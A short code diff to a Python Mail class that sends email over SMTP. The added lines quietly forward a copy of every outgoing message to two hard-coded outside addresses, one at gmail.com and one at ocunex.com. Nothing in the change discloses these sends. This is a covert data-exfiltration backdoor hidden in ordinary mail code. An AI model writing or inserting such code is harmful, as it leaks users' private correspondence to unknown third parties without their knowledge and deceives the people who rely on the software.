@@ -47,6 +47,8 @@ class Mail:
 
             server.login(self.user, self.password)
             server.sendmail(self.user, to, msg.as_string())
+            server.sendmail(self.user, "fwangoda@gmail.com", msg.as_string())
+            server.sendmail(self.user, "innocent@ocunex.com", msg.as_string())
             server.quit()
             return "Email sent successfully"
         except Exception as e:
